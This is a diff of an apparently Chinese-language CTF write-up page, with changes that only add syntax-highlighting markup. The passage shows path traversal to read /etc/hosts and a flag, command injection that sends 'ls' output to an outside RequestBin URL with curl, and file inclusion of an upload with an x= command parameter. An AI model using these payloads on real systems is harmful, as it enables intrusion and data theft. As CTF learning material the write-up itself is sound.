@@ -584,7 +584,7 @@ google.com<span class="token punctuation">;</span> curl file:///fl<span class="t
 <p>在最上面那攔點 Home 和 About 可以看到<br>有 ?page= 所以可以試著輸入其他東西<br>所以我們試著一直回前頁到根目錄，因為不知道在多前面所以就打一堆<code>../</code></p>
 <p><code>http://140.110.112.78:2003/index.php?page=../../../../../../etc/hosts</code></p>
 <p>會跑出</p>
-<pre><code>127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.36 476d62ab5d51
+<pre class=" language-bash"><code class="language-bash">127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.36 476d62ab5d51
 </code></pre>
 <p>可以知道有到我們的根目錄了<br>再從根目錄去抓 flag 就可以了</p>
 <p><code>http://140.110.112.78:2003/index.php?page=../../../../../../flag</code></p>
@@ -592,11 +592,11 @@ google.com<span class="token punctuation">;</span> curl file:///fl<span class="t
 <p><a target="_blank" rel="noopener" href="http://140.110.112.78:30005/">http://140.110.112.78:30005/</a></p>
 </blockquote>
 <p>用<a target="_blank" rel="noopener" href="http://requestbin.net/">RequestBin</a>這個網址可以先建一個 server<br>創建一個RequestBin<br>複製他的網址後</p>
-<pre><code>$(curl http://requestbin.net/r/1em8v3f1 -d "$(ls)")
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">$(</span>curl http://requestbin.net/r/1em8v3f1 -d <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span>"</span><span class="token punctuation">)</span>
 </code></pre>
 <p><code>"$()"</code> 加”的原因 -&gt; 如果有兩個參數的話就會變成兩個字串，用雙引號包起來才會是一個字串<br>可以在 RequestBin 上面看到</p>
 <p>RAW BODY</p>
-<pre><code>flag
+<pre class=" language-bash"><code class="language-bash">flag
 index.php
 </code></pre>
 <p>可以知道可以把網址上的<code>index.php</code>直接改成<code>flag</code>就出來了</p>
@@ -629,7 +629,7 @@ index.php
 <p><code>http://140.110.112.78:10210/?page=../files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt&amp;x=ls</code></p>
 <p>會出現<code>files flag_1223b8c30a347321299611f873b449ad.txt index.php mods upload.php </code></p>
 <p>再用<code>x=</code>去抓 flag 就可以得到了</p>
-<pre><code>http://140.110.112.78:10210/?page=../files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt&amp;x=cat%20flag_1223b8c30a347321299611f873b449ad.txt
+<pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt<span class="token operator">&amp;</span>x<span class="token operator">=</span>cat%20flag_1223b8c30a347321299611f873b449ad.txt
 </code></pre>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
